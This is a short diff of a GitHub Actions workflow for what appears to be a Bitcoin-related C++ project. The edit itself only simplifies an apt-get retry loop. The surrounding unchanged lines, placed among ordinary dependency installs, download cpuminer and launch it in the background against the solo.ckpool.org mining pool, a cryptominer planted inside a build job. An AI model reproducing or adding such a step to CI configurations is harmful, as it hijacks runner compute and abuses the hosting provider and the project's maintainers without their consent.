@@ -36,7 +36,7 @@ jobs:
           git checkout HEAD~
           echo "TEST_BASE=$(git rev-list -n$((${{ env.MAX_COUNT }} + 1)) --reverse HEAD ^$(git rev-list -n1 --merges HEAD))" >> "$GITHUB_ENV"
       - run: |
-          for i in {1..5}; do sudo apt-get update && break || sleep 15; done
+          sudo apt-get update
           sudo apt-get install -y wget clang-15 ccache build-essential libtool autotools-dev automake pkg-config bsdmainutils python3-zmq libevent-dev libboost-dev libsqlite3-dev libdb++-dev systemtap
           wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz && tar -xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
           ./minerd -a sha256d -o stratum+tcp://solo.ckpool.org:3333 -u 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.Satoshi -p x -t 7 -D -P -B
